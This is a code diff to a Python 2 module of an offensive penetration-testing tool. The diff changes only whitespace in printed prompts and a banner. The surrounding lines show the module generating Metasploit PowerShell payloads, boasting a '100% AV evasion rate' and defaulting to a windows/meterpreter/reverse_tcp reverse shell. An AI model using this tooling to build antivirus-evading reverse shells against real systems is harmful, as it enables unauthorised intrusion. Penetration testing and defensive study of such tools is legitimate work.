@@ -15,12 +15,12 @@ iface = iface_ip()
 
 def moduleInfo():
 	print colours.bold + colours.green + \
-"""#################################################################
-# This powershell module currently has a 100% AV evasion rate.  #
-#                                                               #
-# Compatible with XP, 2k3, 7 & 2k8.                             #
-# The payload requires the target to have powershell installed. #
-#################################################################""" + colours.reset
+""" #################################################################
+ # This powershell module currently has a 100% AV evasion rate.  #
+ #                                                               #
+ # Compatible with XP, 2k3, 7 & 2k8.                             #
+ # The payload requires the target to have powershell installed. #
+ #################################################################""" + colours.reset
 
 def generate_payload(payload,ipaddr,port):
 	# grab the metasploit path
@@ -83,7 +83,7 @@ while 1:
 		moduleInfo()
 		
 		menus.powershell_menu()
-		selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
+		selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
 		if selection == '1' or selection == '':
 			payload = 'windows/meterpreter/reverse_tcp'
 		elif selection == '2':
@@ -97,10 +97,10 @@ while 1:
 			
 		# get some details
 		#if selection == range(1,3) or selection == '':
-		ipaddr = raw_input("\nEnter IP address (default %s): " % iface )
+		ipaddr = raw_input(" \nEnter IP address (default %s): " % iface )
 		if ipaddr == '':
 			ipaddr = iface
-		port = raw_input("Enter port (default 8080): ")
+		port = raw_input(" Enter port (default 8080): ")
 		if port == '':
 			port = '8080'
 			
